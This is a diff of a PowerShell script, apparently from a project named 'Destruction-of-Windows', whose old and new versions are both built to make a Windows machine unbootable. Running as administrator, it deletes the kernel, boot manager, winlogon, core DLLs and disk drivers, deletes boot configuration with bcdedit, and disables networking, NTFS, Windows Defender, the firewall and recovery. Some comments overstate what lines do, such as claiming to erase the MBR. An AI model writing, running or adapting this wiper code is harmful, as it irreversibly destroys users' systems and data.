@@ -1,7 +1,6 @@
-# Destruction-of-Windows
-Windows Complete Destruction
-# Extreme Destruction of Windows Script - USE AT YOUR OWN RISK
-# This script will make the system unbootable or render it unusable.
+# Final Stage: Maximum Destruction Script - BEYOND EXTREME
+# This script will obliterate your system beyond recovery. Use only in a test environment. 
+# YOU HAVE BEEN WARNED!
 
 # Ensure script is run as Administrator
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
@@ -9,93 +8,106 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     exit
 }
 
-# PART 1: Remove Windows UI and Shell Functionality
+Write-Host "Starting extreme destruction of the Windows system..." -ForegroundColor Red
 
-Write-Host "Disabling Windows Shell (Explorer)..." -ForegroundColor Red
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "cmd.exe" -Force
-# Alternatively, blank shell for no shell at all
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "" -Force
+# PART 1: Complete Shell and GUI Removal
 
-Write-Host "Deleting Explorer.exe and dwm.exe..." -ForegroundColor Red
+Write-Host "Removing Windows GUI (Shell, Taskbar, Explorer) and graphical components..." -ForegroundColor Red
+# Set shell to an invalid executable to prevent any GUI from loading
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "nonexistent.exe" -Force
+
+# Delete essential graphical components
 Remove-Item -Path "C:\Windows\explorer.exe" -Force
 Remove-Item -Path "C:\Windows\System32\dwm.exe" -Force
+Remove-Item -Path "C:\Windows\System32\userinit.exe" -Force
+Remove-Item -Path "C:\Windows\System32\Taskmgr.exe" -Force  # Disable Task Manager completely
 
-Write-Host "Disabling Taskbar and System Tray..." -ForegroundColor Red
+Write-Host "Removing System Tray and Taskbar functionality..." -ForegroundColor Red
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoTrayItemsDisplay" -Value 1 -Force
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "NoTaskGrouping" -Value 1 -Force
 
-# PART 2: Remove Networking Functionality Completely
+# PART 2: Core Networking and Kernel-Level Destruction
 
-Write-Host "Disabling TCP/IP Stack and Networking..." -ForegroundColor Red
+Write-Host "Destroying core networking and TCP/IP stack..." -ForegroundColor Red
 New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "EnableTCP" -Value 0 -Force
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" -Name "EnableNetbiosOverTcpip" -Value 0 -Force
 
-Write-Host "Deleting Core Network Drivers..." -ForegroundColor Red
+Write-Host "Deleting network drivers (tcpip.sys, ndis.sys)..." -ForegroundColor Red
 Remove-Item -Path "C:\Windows\System32\drivers\tcpip.sys" -Force
 Remove-Item -Path "C:\Windows\System32\drivers\ndis.sys" -Force
+Remove-Item -Path "C:\Windows\System32\drivers\NetBT.sys" -Force  # Delete NetBIOS support
 
-Write-Host "Disabling DHCP, DNS, and NetBIOS services..." -ForegroundColor Red
+Write-Host "Disabling DHCP, DNS, and NetBIOS services completely..." -ForegroundColor Red
 Set-Service -Name Dhcp -StartupType Disabled
 Set-Service -Name Dnscache -StartupType Disabled
 Set-Service -Name NetBT -StartupType Disabled
-Set-Service -Name LanmanWorkstation -StartupType Disabled
-Set-Service -Name LanmanServer -StartupType Disabled
-Stop-Service -Name Dhcp, Dnscache, NetBT, LanmanWorkstation, LanmanServer -Force
+Stop-Service -Name Dhcp, Dnscache, NetBT -Force
 
-# PART 3: Attack the Kernel - Disable Kernel-Level Protections
+# PART 3: Complete Kernel Destruction and Recovery Blocking
 
-Write-Host "Disabling Kernel Patch Protection and Secure Boot..." -ForegroundColor Red
+Write-Host "Disabling Kernel Patch Protection, CPU scheduling, and recovery options..." -ForegroundColor Red
 New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "DisableKernelPatchProtection" -Value 1 -Force
-New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State" -Name "UEFISecureBootEnabled" -Value 0 -Force
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Scheduler" -Name "Start" -Value 4 -Force  # Disable CPU Scheduler
 
-Write-Host "Disabling CPU Scheduler and Thread Management..." -ForegroundColor Red
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Scheduler" -Name "Start" -Value 4 -Force
+Write-Host "Deleting Kernel Components (ntoskrnl.exe, winload.exe)..." -ForegroundColor Red
+Remove-Item -Path "C:\Windows\System32\ntoskrnl.exe" -Force  # Main Kernel
+Remove-Item -Path "C:\Windows\System32\winload.exe" -Force  # Boot loader
 
-Write-Host "Deleting Critical Kernel Files (ntoskrnl.exe)..." -ForegroundColor Red
-Remove-Item -Path "C:\Windows\System32\ntoskrnl.exe" -Force
+Write-Host "Deleting BOOTMGR to prevent recovery..." -ForegroundColor Red
+Remove-Item -Path "C:\bootmgr" -Force  # Boot Manager
 
-# PART 4: Destroy Core Services - Task Scheduler, WMI, and System Restore
+Write-Host "Deleting Winlogon.exe (Logon process)..." -ForegroundColor Red
+Remove-Item -Path "C:\Windows\System32\winlogon.exe" -Force  # Logon process deletion will block login
 
-Write-Host "Disabling Task Scheduler completely..." -ForegroundColor Red
-Set-Service -Name Schedule -StartupType Disabled
-Stop-Service -Name Schedule -Force
+# PART 4: Destruction of File System and Boot Config
 
-Write-Host "Disabling WMI (Windows Management Instrumentation)..." -ForegroundColor Red
-Set-Service -Name Winmgmt -StartupType Disabled
-Stop-Service -Name Winmgmt -Force
+Write-Host "Disabling NTFS file system and boot configuration..." -ForegroundColor Red
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Ntfs" -Name "Start" -Value 4 -Force  # Disable NTFS
 
-Write-Host "Disabling System Restore and Volume Shadow Copy..." -ForegroundColor Red
-Disable-ComputerRestore -Drive "C:\" 
-Set-Service -Name VSS -StartupType Disabled
-Stop-Service -Name VSS -Force
+Write-Host "Deleting Volume Snapshot and paging files..." -ForegroundColor Red
+Remove-Item -Path "C:\Windows\System32\drivers\volsnap.sys" -Force  # Volume shadow copy deletion
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force  # Disable paging file
 
-# PART 5: Remove File System Components and Disk I/O
+# PART 5: Power Management and System Integrity Destruction
 
-Write-Host "Disabling NTFS File System..." -ForegroundColor Red
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Ntfs" -Name "Start" -Value 4 -Force
+Write-Host "Disabling ACPI (Power management) and Secure Boot..." -ForegroundColor Red
+Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Services\ACPI" -Name "Start" -Value 4 -Force  # Disable ACPI
+New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State" -Name "UEFISecureBootEnabled" -Value 0 -Force  # Disable Secure Boot
 
-Write-Host "Disabling Volume Snapshots (VSS)..." -ForegroundColor Red
-Remove-Item -Path "C:\Windows\System32\drivers\volsnap.sys" -Force
+# PART 6: Disabling All System Recovery Options
 
-Write-Host "Deleting Paging File (Virtual Memory) and disabling Disk I/O..." -ForegroundColor Red
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Value "" -Force
+Write-Host "Disabling Safe Mode and all recovery options..." -ForegroundColor Red
+bcdedit /delete {default} /f  # Delete the default boot entry
+bcdedit /set {bootmgr} recoveryenabled No  # Disable Windows Recovery Environment (WinRE)
 
-# PART 6: Break Windows Boot Process and Integrity Checks
+Write-Host "Deleting boot configuration data (BCD) store..." -ForegroundColor Red
+bcdedit /delete {bootmgr} /f  # Deletes the boot manager completely
 
-Write-Host "Deleting Boot Configuration Data (BCD)..." -ForegroundColor Red
-bcdedit /delete {bootmgr} /f
+# PART 7: Final Destruction - Removing Core Libraries and Security Features
 
-Write-Host "Disabling Secure Boot Integrity Checks..." -ForegroundColor Red
-New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "DisableIntegrityChecks" -Value 1 -Force
+Write-Host "Deleting Critical DLLs and Libraries (kernel32.dll, advapi32.dll)..." -ForegroundColor Red
+Remove-Item -Path "C:\Windows\System32\kernel32.dll" -Force  # Main system library
+Remove-Item -Path "C:\Windows\System32\advapi32.dll" -Force  # Advanced API library (security and registry management)
 
-# PART 7: Final Destruction - Remove Critical Libraries and Services
+Write-Host "Removing Windows Defender and Firewall components..." -ForegroundColor Red
+Set-Service -Name MpsSvc -StartupType Disabled  # Disable Windows Firewall
+Stop-Service -Name MpsSvc -Force
+Remove-Item -Path "C:\Windows\System32\mpssvc.dll" -Force  # Delete Firewall service
 
-Write-Host "Deleting Critical System Libraries (kernel32.dll, winlogon.exe)..." -ForegroundColor Red
-Remove-Item -Path "C:\Windows\System32\kernel32.dll" -Force
-Remove-Item -Path "C:\Windows\System32\winlogon.exe" -Force
+Write-Host "Removing Windows Defender and associated services..." -ForegroundColor Red
+Set-Service -Name WinDefend -StartupType Disabled
+Stop-Service -Name WinDefend -Force
+Remove-Item -Path "C:\Windows\System32\drivers\wd.sys" -Force  # Remove Defender driver
 
-# PART 8: Power Management and HAL Destruction
+# PART 8: Crippling Disk I/O and Boot Process
 
-Write-Host "Disabling Power Management and HAL (Hardware Abstraction Layer)..." -ForegroundColor Red
-Set-Service -Name ACPI -StartupType Disabled
-Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Services\hal" -Name "Start" -Value 4 -Force
+Write-Host "Disabling Disk I/O (IDE, SATA, and NVMe drivers)..." -ForegroundColor Red
+Remove-Item -Path "C:\Windows\System32\drivers\disk.sys" -Force  # Main disk driver
+Remove-Item -Path "C:\Windows\System32\drivers\storport.sys" -Force  # Storage controller
+Remove-Item -Path "C:\Windows\System32\drivers\iaStorA.sys" -Force  # Intel SATA controller
+Remove-Item -Path "C:\Windows\System32\drivers\nvme.sys" -Force  # NVMe driver
 
-Write-Host "All critical destruction steps are complete. Your system is now irreversibly broken. Rebooting will likely result in complete failure to boot." -ForegroundColor Green
+Write-Host "Deleting Master Boot Record (MBR) and partition table..." -ForegroundColor Red
+Remove-Item -Path "C:\Windows\System32\drivers\partmgr.sys" -Force  # Delete partition manager
+
+Write-Host "Extreme destruction complete. The system is now beyond recovery." -ForegroundColor Red
